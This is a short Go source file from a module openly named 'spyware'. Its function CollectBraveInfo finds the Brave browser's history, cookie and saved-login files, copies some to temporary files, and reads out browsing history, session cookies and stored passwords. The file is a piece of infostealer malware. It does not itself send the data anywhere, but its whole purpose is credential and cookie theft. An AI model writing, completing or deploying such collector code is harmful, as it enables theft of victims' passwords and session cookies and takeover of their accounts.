package collectors

import (
	"github.com/Nevesto/spyware/browsers/brave"
	"github.com/Nevesto/spyware/models"
)

func CollectBraveInfo() models.BraveInfo {
	var info models.BraveInfo

	historyFile, err := brave.FindHistoryFile()
	if err == nil && historyFile != "" {
		tmpHistoryFile, err := brave.CopyFile(historyFile)
		if err == nil {
			info.History, _ = brave.ReadHistory(tmpHistoryFile)
		}
	}

	cookieFile, err := brave.FindCookieFile()
	if err == nil && cookieFile != "" {
		tmpCookieFile, err := brave.CopyFile(cookieFile)
		if err == nil {
			info.Cookies, _ = brave.ReadCookies(tmpCookieFile)
		}
	}

	loginDataFile, err := brave.FindLoginDataFile()
	if err == nil && loginDataFile != "" {
		info.Passwords, _ = brave.ReadPasswords(loginDataFile)
	}

	return info
}
